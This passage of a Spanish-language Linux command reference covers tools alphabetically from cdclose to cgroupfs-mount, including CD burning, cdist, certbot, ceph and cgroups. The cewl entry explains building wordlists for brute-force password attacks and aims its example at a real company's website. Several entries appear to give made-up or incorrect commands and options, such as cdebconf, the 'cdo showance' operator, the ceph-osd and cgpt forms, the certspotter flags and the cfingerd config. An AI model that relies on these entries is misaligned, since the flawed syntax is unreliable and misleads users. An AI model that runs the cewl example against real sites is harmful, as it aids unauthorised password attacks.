$ cdclose -d /dev/sr0 (especificando el dispositivo [cdrom0...])


cdcover
Herramienta que crea carátulas de CD, insertado en /media/cdrom.
$ cdcover -t TITULO -s SUBTITULO -b "La mejores canciones del autor" -c 13 (establecer, título, subtítulo, texto explicativo y número de CD


cdda2wav
Extraer pistas de audio de un cd
$ cdda2wav -B -H -D /dev/sdxx -s -x (extrae disco completo en archivos wav separados.)
$ cdda2wav -H -D /dev/sdxx -s -x -t 5 (extrae la pista nº 5)


cdde
Programa que detecta cuando una unidad de CD/DVD-ROM tiene un disco insertado. Cuando encuentra un disco insertado en la unidad, intentará determinar el tipo de disco y ejecutará un comando específico. Esto significa que se puede insertar un DVD y se iniciará un software de DVD determinado, o se puede montar automáticamente un CD de datos, etc. Los comandos se definen en un archivo de configuración que por defecto es ~/.cdde.xml. Un  ejemplo podría sera:
         <?xml version="1.0"?>
         <cdde delay="5000000">
           <drive path="/dev/cdroms/cdrom0"/>
             <audio command="xmms %mnt%"/>
             <data command="mount %mnt%"/>
             <dvd
              command="xterm -iconic -e mplayer -fs -xineramascreen 1 -dvd 1"/>
             <vcd
              command="xterm -iconic -e mplayer -fs -xineramascreen 1 -vcd 1"/>
             <svcd
              command="xterm -iconic -e mplayer -fs -xineramascreen 1 -vcd 1"/>
             <blank command="gcombust"/>
             <mixed command="mount %mnt%"/>
           </drive>
         </cdde>


cde
[Code, Data, and Environment]. Herramienta que empaqueta automáticamente todo el entorno necesario para ejecutar un comando de Linux y empaquetarlo en un archivo portátil. Esto incluye binarios, bibliotecas, scripts y otros recursos, de manera que puedas reproducir la ejecución en otra máquina sin necesidad de configuración adicional y sin ninguna instalación. El único requisito es que la otra computadora ha de tener la misma arquitectura de hardware [por ejemplo, x86_64] y la misma versión principal del kernel [por ejemplo, 2.6.X]
$ cde ls (crea un directorio llamado cde-package que contiene todos los archivos necesarios para ejecutar el comando "ls" en otro sistema)
Una vez copiado el directorio cde-package a la otra máquina se ejecuta el programa:
$ cd cde-package
$ ./cde-exec ls
Para empaquetar un programa con múltiples dependencias, como python3 ejecutando un script:
$ cde python3 script.py
Esto creará un paquete que incluye: El intérprete de Python, el script y cualquier archivo que lea y las bibliotecas necesarias. En la máquina de destino, simplemente se copia el directorio y se ejecuta:
$ cd cde-package
$ ./cde-exec python3 script.py
También se puede empaquetar aplicaciones gráficas como gedit:
$ cde gedit (capturará las bibliotecas relacionadas con el entorno gráfico y los recursos necesarios)
Y, una vez copiado cde-package en la otra máquina, se ejecuta:
$ cd cde-package
$ ./cde-exec gedit
Para empaquetar un servidor es exactamente igual:
$ cde python3 -m http.server
Para empaquetar compilaciones y entornos de desarrollo:
$ cde gcc main.c -o main


cdebconf
Parte del sistema de configuración Debconf y se utiliza para interactuar con la interfaz de configuración de paquetes Debian.
# cdebconf debconf-string/hostname string "mihost" (configura el nombre del host en la instalación)
# cdebconf debconf-select/multiple select "miopcion" otraopcion" (configurar varias opciones en la configuración)
# cdebconf debconf-defaults boolean true (establece un valor booleano como verdadero por defecto)
# cdebconf debconf-show hostname (muestra el valor actual del campo de configuración "hostname")
# cdebconf debconf-set debconf-string/hostname string "nuevoNombre" (cambia el valor del campo "hostname" a "nuevoNombre")


cdebootstrap
Genera sistemas desde cero para Debian y derivados. Esta implementación es diferente a la de debootstrap [ver]. La configuración de cdebootstrap es más sencilla, pero la configuración de debootstrap tiene la ventaja de ser más explícita con listas completas de paquetes.
# cdebootstrap --variant=minimal bullseye rootfs.tar.gz http://deb.ian.org/debian/ (nombre de la versión de Debian, el archivo resultante que contendrá el sistema operativo y la URL del repositorio de Debian)
# cdebootstrap --variant=standard bullseye rootfs.tar.gz http://deb.ian.org/debian/ --include=firmware-linux-nonfree
# cdebootstrap --variant=build bullseye rootfs.tar.gz http://deb.ian.org/debian/ --include=firmware-linux-free
La variante build instala essential, apt y build-essential, la minimal, instala essential y apt y la standard [predeterminada] instala paquetes de prioridad importantes y requeridos.


cdecl
Es un programa que convierte frases de programación en C++ a frases similares del inglés.
$ cdecl "void (*foo[3])(int)" (se traducirá como "array of pointers to functions taking an integer parameter")
$ cdecl "struct foo { int x; char y; }" (se traducirá como "structure containing an integer and a character")
$ cdecl "int *x[10]" (resultará en "array of 10 pointers to integers")
$ cdecl "typedef struct { int (*f)(char); double d; } S;" (se traducirá como "typedef structure containing a pointer to function taking a character parameter and returning an integer, and a double")


cdeject
[cdtool]. Abrir el cd. Ver eject
$ cdeject -d /dev/sr0 (especificando el dispositivo [cdrom0....])


cdinfo
[cdtool libcdio-utils]. Muestra Información del cd si se encuentra disponible. En algunas distros cd-info
$ cdinfo -d /dev/sr0


cdist
Sistema de gestión de configuración utilizable. A diferencia de otras herramientas, cdist utiliza scripts shell para definir y aplicar configuraciones. Asegúrate de que se tiene acceso SSH al host remoto que deseas gestionar. Crear un directorio para almacenar las configuraciones de cdist:
# mkdir -p cdist-configs/{conf,bin,type}
# cd ~/cdist-configs
conf: Contiene las configuraciones declarativas , bin: Los scripts personalizados y type: Define tipos de configuraciones reutilizables.
1.-
Como ejemplo, imaginemos que se precisa instalar nginx en un servidor remoto: Definir un script de configuración en:
# nano  ~/cdist-configs/conf/manifest/init
        #!/bin/sh
        __package nginx
Aquí, __package es un tipo predefinido que instala un paquete en el sistema remoto.
$ cdist deploy --host 192.168.1.100 --user user (aplicar la configuración al host remoto)
Para asegurarte de que un archivo de configuración específico está presente en un servidor:
# nano ~/cdist-configs/conf/manifest/init
       #!/bin/sh
       __file /etc/nginx/nginx.conf \
       --source /path/to/nginx.conf
El tipo __file asegura que el archivo /etc/nginx/nginx.conf tenga el contenido especificado en source.
$ cdist deploy --host server.example.com (aplicar la configuración)
Si se necesita crear un usuario en el sistema remoto llamado deploy:
# nano ~/cdist-configs/conf/manifest/init
    #!/bin/sh
    __user deploy \
    --home /home/deploy \
    --shell /bin/bash
El tipo __user crea usuarios en el sistema remoto.
$ cdist deploy --host 192.168.1.200 (aplicar la configuración)
Se puede combinar varios tipos en un manifiesto para aplicar configuraciones complejas. Por ejemplo, para instalar nginx, configurar su archivo de configuración y reiniciar el servicio:
# nano ~/cdist-configs/conf/manifest/init
       #!/bin/sh
       __package nginx
       __file /etc/nginx/nginx.conf \
       --source /path/to/nginx.conf
       __service nginx --state restarted
$ cdist deploy --host 192.168.1.100 (aplicar la configuración)
$ cdist list-types (lista todos los tipos disponibles en la instalación)


cdir
[cdtool]. Información sobre el directorio del cd
$ cdir -n (Duración de las canciones de un cd)
$ cdir -d /dev/sr0 -r (Lo mismo especificando dispositivo)


cdlabelgen
Fue diseñado para simplificar el proceso de generación de etiquetas para CD y DVD. Se originó como un programa que permitía la generación automática de tarjetas frontales y de bandeja para CD grabados mediante un mecanismo automatizado, pero ahora se ha vuelto popular para etiquetar compilaciones de CD de archivos mp3 y copias de CD. Tenga en cuenta que cdlabelgen en realidad no imprime nada, solo genera PostScript, con el que puede hacer lo que se quiera. Las imágenes se pueden encontrar en /usr/share/cdlabelgen o /usr/local/share/cdlabelgen.
$ cdlabelgen -c "Mi Álbum Favorito" -s "Música Rock" -i "Track 1%Track 2%Track 3" -e postscript/recycle.epsi -o mi_album.ps (genera un archivo PostScript con la etiqueta del álbum, incluyendo los tracks y usando el ícono de reciclaje como imagen de fondo)
$ cdlabelgen -c "Proyecto de Programación" -s "Código Fuente" -i "Archivo1.cpp%Archivo2.h%Main.cpp" -e /ruta/a/mi_magen_personalizada.epsi -E /ruta/a/otra_imagen.epsi > proyecto_programacion.ps (usa imágenes personalizadas tanto para la cubierta como para el trayecto)
$ cdlabelgen -c "Mi Proyecto" -s "Subproyecto" -i "Archivo1%Archivo2%Archivo3" -b > sin_titulo_trayecto.ps (omite el título y subtítulo del trayecto, permitiendo más espacio para los items)
$ cdlabelgen -c "Mi Álbum" -s "Rock Clásico" -e postscript/mp3.epsi -S 1.5 -E postscript/cd.eps -T 0.8 > album_rock.ps (escala automáticamente la imagen del MP3 para que ocupe toda la cubierta y ajusta la imagen del CD en el trayecto)


cdo
[Climate Data Operators - operadores de datos climáticos]. Son una colección de operadores para manipular y analizar datos de modelos climáticos. Los formatos de datos admitidos son GRIB, netCDF, SERVICE, EXTRA e IEG. Hay más de 400 operadores disponibles.
$ cdo list *nc (listar archivos)
$ cdo merge file1.nc file2.nc merged_file.nc (combinar múltiples archivos)
$ cdo selvar,vname=temperature file.nc temperature_only.nc (extraer variables específicas)
$ cdo mulc,3600 file.nc file_seconds.nc (cambiar unidades)
$ cdo mean file.nc mean_file.nc (calcular promedios)
$ cdo remdim time file.nc reduced_dim_file.nc (eliminar dimensiones)
$ cdo copy file.grb file.nc (convertir entre formatos)
$ cdo sub,file.nc another_file.nc result.nc (aplicar funciones matemáticas)
$ cdo selbox,lon=-50:0,lat=30:40 file.nc selected_data.nc (extracción de datos por coordenadas)
$ cdo showance file.nc image.png (crear gráficos)


cdparanoia
Extraer pistas de audio de un cd.
$ cdparanoia -B -d /dev/sdxx (extrae disco completo en archivos wav separados)
$ cdparanoia 5 -d /dev/sdxx (extrae el track nº 5)
$ cdparanoia  "2[:35.00]-2[2:30.00]" (extraer solo de la pista 2 del minuto 1,35 al 2,35)


cdpr
Escucha en interfaces de red específicas los paquetes de CDP [Cisco Discovery Protocol - Protocolo Cisco Discovery] que es un protocolo de propiedad de Cisco que permite a sus dispositivos comunicarse independientemente de la conectividad de la capa de red. Luego, decodifica esos paquetes y genera la información.
# cdpr -i eth0 (escucharía los paquetes CDP en la interfaz de red eth0)
# cdpr (escuvhar los paquetes en todas las interfaces)
# cdpr -d (mostrar información detallada de los dispositivos CDP)
# cdpr -n "Nombre del dispositivo" (filtrar por un nombre específico o dirección MAC)
# cdpr -t 60 (escuchar durante un período de tiempo específico)


cdr2odg
Utilidad para convertir documentos de Corel Draw a documentos OpenDocument Draw.
$ cdr2odg entrada.cdr salida.odf


cdrdao
Extraer / grabar pistas de CD en modo DAO (Disk at once)
# cdrdao read-cd -v 2 --device /dev/cdrom --read-raw --datafile imagen.bin imagen.toc (Extraer junto a su tabla de contenidos)
# cdrdao copy -v 2 --device 0,0,0 --source-device 0,1,0 --speed 4 --buffers 64 --reload --eject --on-the-fly --fast-toc (copia al vuelo de CD)
# cdrdao read-cd -v 2 --device 0,1,0 --read-raw --datafile img.bin img.toc (Extraer imagen)
# cdrdao write -v 2 --device 0,3,0 --speed 4 --buffers 64 img.toc (Grabar imagen)


cdrecord
Grabación de cds.
$ cdrecord -scanbus (Escaneo de grabadoras)
$ cdrecord -v dev=/dev/sdd imagen.iso (modo básico)
$ cdrecord -v dev=0,1,0 speed=4 -isosize /dev/scd0 (copiar directamente de un dispositivo a otro)
$ cdrecord -v -eject speed=8 dev=0,0,0 test.iso (iniciar la grabación)
$ cdrecord -v dev=/dev/cdrom blank=fast (Borrar un cd regrabable)
opciones
-v .- muestra más información de salida
-eject .- expulsa el disco al finalizar la grabación
-speed .- especifica la velocidad de grabación
-dev .- número de dispositivo [0,1,0] obtenido con cdrecord -scanbus
-dummy .- simula la grabación


cdrestore
Utilidad diseñada para facilitar la transmisión de copias de seguridad hacia discos CD-R(W).
$ cdrestore -v /dev/cdrw backup.iso (modo detallado, restaurar una iso a un CD
Nota.- la opción -d ejecuta la operación en modo dry-run [sin escribir datos]


cdrskin
Alternativa a cdrecord, que se utiliza para grabar datos en medios ópticos como CD y DVD. Ofrece una interfaz compatible con cdrecord y funciona bien para muchas tareas relacionadas con la grabación de discos.
$ cdrskin --devices (identifica los dispositivos ópticos disponibles en el sistema)
$ cdrskin -v dev=/dev/sr0 fs=16m speed=16 -eject /ruta/a/imagen.iso (salida detallada, especifica el dispositivo óptico, tamaño de bufer, expulsar el disco al finalizar y ruta del archivo de imagen que se desea grabar
Si se tiene un conjunto de archivos o carpetas que se desea grabar en un CD/DVD, primero se ha des crear un sistema de archivos ISO y luego grabarlo:
$ mkisofs -o disco_datos.iso /ruta/del/directorio
$ cdrskin -v dev=/dev/sr0 disco_datos.iso
Para grabar un CD de audio, se necesita archivos en formato WAV.
$ cdrskin dev=/dev/sr0 -audio -swab track1.wav track2.wav track3.wav (grabar un disco de audio desde archivos WAV -audio: Indica que se está grabando un CD de audio y -swab: Cambia el orden de bytes si los archivos WAV lo requieren)
$ cdrskin dev=/dev/sr0 blank=fast (borrado rápido)
$ cdrskin dev=/dev/sr0 blank=all (borrado completo)
1.-
Crear un disco híbrido para que puede ser leído tanto en sistemas Linux como en Windows:
$ mkisofs -o disco_hibrido.iso -J -r /ruta/del/directorio (-J: Activa el soporte para nombres largos en Windows y -r: Activa el soporte para permisos en Linux)
$ cdrskin -v dev=/dev/sr0 disco_hibrido.iso (graba la .iso)
$ cdrskin dev=/dev/sr0 -atip (verificar el estado del disco y el dispositivo mostrando información téxnica, capacidad y tipo)


cdtool
Colección de herramientas para gestionar y controlar la reproducción de CDs de audio en unidades de CD-ROM. Las herramientas son cdadd [Agrega pistas de un CD de audio a la lista de reproducción actual], cdclose [Cierra la bandeja de la unidad de CD], cdctrl [Controla la reproducción del CD: reproducir, pausar, saltar pistas], cdeject [Expulsa la bandeja del CD], cdinfo [Muestra información sobre el CD actual], cdir [], cdloop, cdown, cdpause [Pausa la reproducción], cdplay [Reproduce el CD], cdreset, cdshuffle, cdstop [Detiene la reproducción], cdtool2cddb y cdvolume [Ajusta el volumen].
$ cdplay 3 (reproducir una pista específica)
$ cdctrl next (saltar a la siguiente pista)
$ cdctrl prev (retroceder a la pista anterior)
$ cdvolume 200 (ajustar el volumen. Niveles de 0 a 255)
$ cdadd 1 2 5 (agregar pistas específicas a una lista de reproducción)
$ cdplay && cdvolume 150 (reproducir un CD y ajustar el volumen)


cdw
Puede gestionar la grabación de CD de audio y datos, a través de una imagen de CD o directamente desde los archivos.
$ cdw (abrirá la interfaz de la aplicación desde la que se puede gestionar todo)


celery
Es una cola de tareas o de trabajos asincrónica basada en el paso de mensajes distribuidos. Está enfocada en el funcionamiento en tiempo real, pero también admite la programación. Las tareas se pueden ejecutar de forma asincrónica [en segundo plano] o sincrónica [esperando hasta que estén listas].
$ celery -A celyconfig.py worker --loglevel=info (ejecutar el worker de Celery)
$ celery -A celyconfig.py inspect active (verificar el estado de las tareas)
$ celery -A celyconfig.py control purge (limpiar las tareas en ejecución)


ceni
Interfaz de curses para configurar interfaces de red.
# Ceni


centreon-plugins
Parte del sistema de monitorización Centreon, que permite supervisar servidores, aplicaciones, redes y más. Esta herramienta funciona como una colección de complementos que se ejecutan desde la línea de comandos para verificar el estado y el rendimiento de sistemas o servicios específicos.
$ centreon_plugins.pl --plugin=apps::protocols::http::plugin --mode=response-time --hostname=example.com --port=80 --urlpath="/" --warning=2 --critical=5 (comprobar el tiempo de respuesta de un servidor)
Las opciones: --hostname: Dirección del servidor web, --urlpath: Ruta que se desea comprobar y --warning y --critical: Establecen umbrales en segundos para emitir alertas.
$ centreon_plugins.pl --plugin=os::linux::snmp::plugin --mode=cpu --hostname=192.168.1.1 --snmp-community=public --snmp-version=2c --warning=80 --critical=90 (verificar el uso de CPU en un servidor mediante SNMP)
La opciones: --hostname: Dirección IP del host, --snmp-community: Cadena de comunidad SNMP, --snmp-version: Versión del protocolo SNMP y --warning y --critical: Umbrales para uso de CPU (%).
$ centreon_plugins.pl --plugin=os::linux::snmp::plugin --mode=disk-usage --hostname=192.168.1.1 --snmp-community=public --snmp-version=2c --warning-usage=80 --critical-usage=90 (supervisar uso de disco en un servidor)
$ centreon_plugins.pl --plugin=network::cisco::standard::snmp::plugin --mode=interfaces --hostname=192.168.1.1 --snmp-community=public --snmp-version=2c --interface=GigabitEthernet0/1 --state=up (ver si una red está activa)
Las opciones: --plugin=network::cisco::standard::snmp::plugin: Especifica el complemento para dispositivos Cisco, --interface: Nombre de la interfaz que se desea supervisar y --state: Especifica el estado esperado por ejemplo, "up".
$ centreon_plugins.pl --plugin=database::mysql::plugin --mode=connections --hostname=127.0.0.1 --port=3306 --username=root --password=secret --warning=50 --critical=100 (verificar conexiones activas en una base de datos MySQL)
$ centreon_plugins.pl --plugin=apps::protocols::http::plugin --help (ver las opciones y modos disponibles para un complemento específico)


ceph
Sistema de almacenamiento distribuido y escalable.
# ceph -s (mostrará información sobre el estado de los nodos, OSDs [Object Storage Daemons], monitores y otros componentes)
# ceph -w
# ceph osd tree (muestra una jerarquía de los OSDs, incluyendo sus estados y capacidades)
# ceph df (verificar el espacio utilizado por los OSDs)
# ceph-osd --id=X --data-dir=/path/to/osd create (agregar un nuevo OSD)
# ceph-osd --id=X remove (eliminar un OSD)
# ceph mon status (verificar el estado de los monitores)
# ceph-mon --id=X create (agregar un nuevo monitor)
# ceph-mon --id=X remove (eliminar un monitor)
# ceph status (verificar el estado de los clientes)
Archivo de configuración de ejemplo:
# nano /etc/ceph/ceph.conf
[global]
fsid=$FSID
mon initial members = mesh-a
mon host = 192.168.18.4
cluster network = 192.168.18.0/24


cert-sync
Importar certificados. Ver update-ca-certificates
$ cert-sync --user /etc/ssl/certs/ca-certificates.crt


certbot
Certbot es una Herramienta utilizada para gestionar certificados SSL/TLS emitidos por Let's Encrypt y otros proveedores que utilizan el protocolo ACME [Automatic Certificate Management Environment]. Su objetivo principal es facilitar la configuración de servidores HTTPS con certificados confiables de manera automatizada. Para configuraciones específicas de servidores como Apache o Nginx, han de instalarse los plugins correspondientes: python3-certbot-apache para Apache o python3-certbot-nginx para Nginx. Incluye la aplicación letsencrypt
# certbot --apache (obtendrá un certificado para el dominio configurado en Apache y configurará automáticamente HTTPS en los archivos de configuración)
# certbot --nginx (el mismo caso para Nginx)
# certbot certonly --standalone -d ejemplo.com -d www.ejemplo.com (obtener el certificado sin configuración automática si no se desea que Certbot configure el servidor)
# certbot renew (renovar certificados automáticamente)
# certbot renew --dry-run (simular una renovación para probar cómo funcionará)
# certbot revoke --cert-path /etc/letsencrypt/live/ejemplo.com/cert.pem (revocar un certificado)
# certbot -d "*.example.com" --manual --preferred-challenges dns certonly (para usar con DNS para dominios wildcard,  requiere validación DNS en la que pedirá crear un registro TXT)
1.-
Añadir un cron job para automatizar completamente la renovación
# crontab -e
Añadir la linea:
           0 0 * * * /usr/bin/certbot renew --quiet
2.-
Ejemplo complero de Certbot + Apache:
# apt install certbot python3-certbot-apache (Instalar Certbot y el plugin de Apache)
Configurar Apache con el dominio.
# certbot --apache -d ejemplo.com -d www.ejemplo.com (ejecutar Certbot para obtener y configurar HTTPS)
Verifica que HTTPS esté funcionando correctamente.
Nota.- certonly: Obtiene el certificado pero no realiza configuraciones y --standalone: Usa un servidor web temporal integrado para realizar el desafío ACME)
3.-
Ejemplo completo Certbot + Nginx:
# apt install certbot python3-certbot-nginx (instalar Certbot y el plugin de Nginx)
Configurar Nginx con el dominio.
# certbot --nginx -d ejemplo.com -d www.ejemplo.com (ejecutar Certbot para obtener y configurar HTTPS)
Verifica que HTTPS esté funcionando correctamente.


certmonger
Herramienta y servicio que funciona en segundo plano para gestionar certificados en sistemas con infraestructura de clave pública (PKI). Se integra con D-Bus para simplificar la obtención, renovación y monitoreo de certificados emitidos por autoridades de certificación (CA). El comando getcert se usa para interactuar con certmonger y gestionar certificados.
$ getcert list (lista todos los certificados su estado y cualquier información relevante como fecha de vencimiento o renovación)
$ getcert request -k /etc/pki/tls/private/mykey.key -f /etc/pki/tls/certs/mycert.crt -C "/bin/systemctl reload nginx" (-k: ruta al archivo de clave privada, -f: Ruta donde se guardará el certificado emitido y -C: Comando a ejecutar después de que el certificado sea renovado, por ejemplo, recargar un servicio como Nginx o Apache)
$ getcert start-tracking -k /etc/pki/tls/private/mykey.key -f /etc/pki/tls/certs/mycert.crt (monitorear certificados y renovarlos automáticamente antes de que expiren)
$ getcert stop-tracking -f /etc/pki/tls/certs/mycert.crt (desactiva la supervisión del certificado especificado)
$ getcert request -c ipa -k /etc/pki/tls/private/ipa.key -f /etc/pki/tls/certs/ipa.crt (solicitar un certificado usando una CA externa configurada [-c])
$ getcert status -f /etc/pki/tls/certs/mycert.crt (mostrará información detallada sobre el certificado, como el estado, validez, y posibles problemas)
$ certmonger-setup-ca --ca-name "MyCustomCA" --url "http://my-ca.example.com/submit" (antes de solicitar certificados, se puede registrar una CA personalizada)
$ getcert request -w -C "/usr/bin/certbot renew && systemctl reload nginx" (aunque certmonger no tiene integración directa con Let's Encrypt, se puede configurar para trabajar con scripts personalizados como certbot)


certspotter
Monitor de registros de transparencia de certificados de SSLMate que avisa cuando se emite un certificado SSL/TLS para un dominio.
$ certspotter --domain example.com (buscará notificaciones de certificados SSL/TLS emitidos por SSLMate para el dominio especificado)
$ certspotter --domain example.com --days 30 --output json --verbose (limita los resultados a los últimos 30 días, produce salida en formato JSON y muestra información adicional)
$ certspotter --domain example.com example.org subdomain.example.com (información sobre varios dominios)
$ certspotter --domain example.com --auth "user:password" (identificarte para acceder a ciertos dominios)
$ certspotter --domain example.com --interval 1h (actualizará automticamente cada hora)


certtool
[gnutls]. Herramienta para analizar y generar certificados, solicitudes y claves privadas X.509. Se puede utilizar de forma interactiva o no interactiva.
$ certtool --generate-privkey --outfile key.pem --rsa (crear una clave RSA [otras opciones: dsa, ecc] privada i que se guarde en key.pem)
$ certtool --certificate-info --infile cert.pem (información sobre un certificado)


cewl
Generador de lista de palabras a partir de las palabras existentes en una página web y que pueden ser utilizadas por otros programas (Bruter, John the Ripper...), para realizar ataques de fuerza bruta.
$ cewl -a -d 3 -m 5 -w wordlist.txt http://www.movistar.es (Incuir metadatos [a], profundidad 2 serían todas las palabras de la web principal y todas las de las webs enlazadas desde esta [-d 2], con un mínimo de 5 caracteres [-m 5] y que lo guarde en wordlist.txt [-w]
$ cewl -w wordlist.txt -o -e URL (que escriba el resultado en wordlist.txt, que escanee enlaces externos y correos electrónicos [e])


cfengine
Conjunto de programas para la gestión autónoma integrada de ordenadores individuales o en red, asegurando que las configuraciones estén en un estado deseado. Se utiliza comúnmente para automatizar tareas de configuración, mantenimiento y gestión. Consta de los siguientes componentes principales: cf-agent [ejecuta las políticas de configuración en los nodos], cf-serverd [proporciona servicios para distribuir políticas y datos a otros nodos], cf-promises [valida la sintaxis de los archivos de política], cf-runagent [ejecuta remotamente cf-agent en los nodos gestionados] y cf-key [genera claves criptográficas para la comunicación segura entre nodos]
# tail -n 100 /var/log/cfengine.log (verificar los logs de cfengine)
# cf-runagent --hosts nodo1,nodo2 (ejecuta políticas en los nodos remotos nodo1 y nodo2)
# systemctl start cf-serverd (iniciar el servidor de políticas)
# cf-key (cada nodo necesita una clave para comunicarse de forma segura)
1.-
Ejemplo simple de estructura básica de un archivo de política [.cf]:
$ cat archivo_politica.cf
bundle agent example_policy
       {
         files:
                "/etc/motd"
                            create => "true",
                edit_lines => append_line("Bienvenido al servidor gestionado por CFEngine.");
       }
En este ejemplo se asegura de que el archivo /etc/motd exista y se añade una línea de texto al final del archivo.
# cf-promises -f archivo_politica.cf (verificar su sintaxis, si es válida, no se mostrará ningún error)
# cf-agent -f archivo_politica.cf (ejecutar el archivo de política)
Nota.- En el servidor, se coloca las políticas en el directorio /var/cfengine/masterfiles para que los nodos gestionados las descarguen.
2.-
Asegurar que el servicio SSH esté activo y configurado correctamente:
# nano ssh_config.cf:
bundle agent ssh_config
       {
           services:
               "ssh"
                   service_policy => "start";
           files:
               "/etc/ssh/sshd_config"
                   comment => "Asegurar que la configuración de SSH cumpla las políticas";
       }
# cf-agent -f ssh_config.cf (ejecutar la política)


cfi-en
Libro sobre cultura, folclore e historia de los hackers de Linus Walleij. Se trata de una traducción del texto original en sueco. En formato HTML. Indice del temario:
$ firefox file:///usr/share/doc/cfi-en/html/mainindex.htm


cfiles
Gestor de archivos de terminal con teclas tipo vim, escrito en C usando la biblioteca ncurses. Su objetivo es proporcionar una interfaz como ranger, siendo al mismo tiempo ligero, rápido y mínimo. Se puede descargar de <https://github.com/mananapr/cfiles.git>


cfingerd
Servicio de red que proporciona información sobre usuarios remotos y puede habilitar o deshabilitar los servicios de finger para usuarios individuales, en lugar de para todos los usuarios de un host determinado. El archivo de configuración está en /etc/cfingerd.conf
# systemctl status cfingerd (verificar si cfingerd está ejecutándose)
# systemctl start cfingerd (iniciar el servicio si no lo está)
Un ejemplo de archivo de configuración podría ser:
# nano /etc/cfingerd.conf
# Configuración general
CFINGERD_OPTS="-l /var/log/cfingerd.log"
#
# Servicios permitidos
ALLOWED_SERVICES="ssh,imap,smtp"
#
# Direcciones IP permitidas
ALLOWED_IPS="192.168.1.0/24 10.0.0.0/8"
#
# Uso de DNS
USE_DNS=Yes
#
# Timeout para conexiones
CONNECT_TIMEOUT=30
#
# Timeout para respuestas
RESPONSE_TIMEOUT=60
#
# Loglevel (debug, info, warn, error)
LOGLEVEL=info
#
# Directorio de certificados
CERT_DIR="/etc/cfingerd/certs"


cfourcc
identifica y cambia el código descripción de FourCC en archivos AVI [*.avi].
$ cfourcc archivo.avi (mostrará el FourCC del archivo AVI especificado)
$ cfourcc -c nuevo_fourcc archivo.avi (nuevo_fourcc es el código descripción de FourCC que se desea aplicar)
$ cfourcc --list (ver todos los códigos descripción de FourCC disponibles)
$ cfourcc -i archvo.avi (información detallada sobre el FourCC de un archivo)
$ for file in *.avi; do cfourcc -c nuevo_fourcc "$file"; done (cambia el FourCC de todos los archivos .avi en el directorio actual)


cftp
Conexión remota por ftp.
$ cftp usuario@host (Despues de solicitar contraseña, entra en el prompt)
cftp> ? (Muestra los comandos disponibles.)
Pulsando “exit” salimos del prompt


cgdb
Interfaz de usuario de curses para el depurador GNU [GNU Debugger - GDB].
$ cgdb ./mi_programa (abrirá la interfaz de cgdb para que se pueda comenzar a depurar)
$ cgdb ./mi_programa rg1 arg2 (pasar argumentos a mi_programa al ejecutarlo con cgdb)


cgpt
Herramienta para manipular la tabla de particiones GUID [GPT]
# cgpt show (verificar información general de las particiones GPT)
# cgpt show /dev/sda3 (mostrar detalles de una partición específica)
# cgpt create -t gpt /dev/sda4 (creará una nueva partición GPT en el dispositivo /dev/sda4)
# cgpt delete /dev/sda5 (eliminará la partición GPT especificada)
# cgpt change-type -t nfs /dev/sdb1 (cambiar el tipo de partición de /dev/sdb1 a NTFS)
# cgpt get-partition-number /dev/sdc (devuelve el número de partición GPT en el dispositivo especificado)
# cgpt list-by-number (mostrará las particiones ordenadas por su número GPT)


cgroup
Es un mecanismo para organizar los procesos jerárquicamente y distribuir los recursos del sistema a lo largo de la jerarquía de una manera controlada y configurable. cgroup se compone principalmente de dos partes: el núcleo y los controladores. El núcleo de cgroup es el principal responsable de organizar los procesos jerárquicamente. Un controlador de cgroup suele ser responsable de distribuir un tipo específico de recurso del sistema a lo largo de la jerarquía, aunque existen controladores de utilidad que cumplen otros propósitos además de la distribución de recursos. A partir de la versión 4.20 del kernel existe un sistema llamado PSI [Pressure Stall Information], que proporciona información sobre cuánto se están estancando sus procesos en subsistemas seleccionados. Esta información se almacena en procfs [/proc/pressure/...], cgroupsv2 y se expresa en el siguiente formato:
      some --  significa que algunos procesos están estancados
      full --  todos los procesos (no inactivos) están estancados
      avgX --  donde X significa segundos y se expresa como porcentaje del tiempo total estancado en uso
Distintas consultas que pueden realizarse:
$ cat /sys/fs/cgroup/cgroup.pressure
$ cat /sys/fs/cgroup/cpu.pressure
$ cat /sys/fs/cgroup/cpu.stat
$ cat /sys/fs/cgroup/memory.stat
$ cat /sys/fs/cgroup/memory.pressure
# cat /proc/cgroups
Un clásico ejemplo:
$ cat /sys/fs/cgroup/system.slice/cpu.pressure
      some avg10=0.00 avg60=0.00 avg300=0.01 total=220679555
      full avg10=0.00 avg60=0.00 avg300=0.00 total=128239145


cgroup-tools
Conjunto de herramientas para gestionar y trabajar con grupos de control [cgroups+. Los cgroups son una característica del kernel de Linux que permite agrupar procesos y asignarles recursos del sistema como CPU, memoria, ancho de banda de red, etc. Incluye las herramientas cgclassify [Clasifica procesos dentro de un cgroup existente], cgcreate [Crea nuevos cgroups], cgdelete [Elimina cgroups existentes], cgexec [Ejecuta un comando dentro de un cgroup], cgget [Obtiene información sobre un cgroup], cgset [Configura parámetros de un cgroup], cgsnapshot, lscgroup, lssubsys, cgclear, cgconfigparser y cgrulesengd.
# cgcreate -g cpu,memory:/example (crear un cgroup llamado example que gestione la CPU [/sys/fs/cgroup/cpu/example] y la memoria [/sys/fs/cgroup/memory/example])
# cgset -r cpu.shares=512 example (definir límites de recursos al valor 512 que representa el 50% de la CPU disponible, el valor predeterminado es 1024 para el 100%)
# cgexec -g cpu,memory:/example stress --cpu 2 (inicia el programa "stress" dentro del cgroup "example", aplicando las restricciones definidas)
# cgclassify -g cpu,memory:/example 12345 (mover un proceso con PID 12345 al cgroup "example")
# cgget -r cpu.shares example (muestra el valor actual del parámetro cpu.shares del cgroup "example")
# cgdelete -g cpu,memory:/example (elimina el cgroup example para los subsistemas cpu y memory)
1.-
Ejemplos prácticos:
# cgcreate -g memory:/lowmem (crear un cgroup llamado lowmen)
# cgset -r memory.limit_in_bytes=100M lowmem (limitar la memoria a 100 MB)
# cgexec -g memory:/lowmem your_command (ejecutar un proceso dentro de este cgroup)
2.-
# cgcreate -g cpu:/lowcpu (crear un cgroup llamado lowcpu)
# cgset -r cpu.shares=256 lowcpu (configurar el uso de CPU al 25%)
# cgexec -g cpu:/lowcpu stress --cpu 1 (ejecutar un proceso dentro de este cgroup)
Nota.- Asegurarse de que el subsistema requerido esté montado en /sys/fs/cgroup. Si no, montarlo manualmente: # mount -t cgroup -o cpu,memory none /sys/fs/cgroup


cgroupfs-mount
Facilita el montaje de los subsistemas de cgroups en los directorios adecuados dentro de /sys/fs/cgroup donde los cgroups no están configurados automáticamente, sin realizar ninguna gestión ni clasificación de tareas en ellos.
# cgroupfs-mount (montar los subsistemas de cgroups)
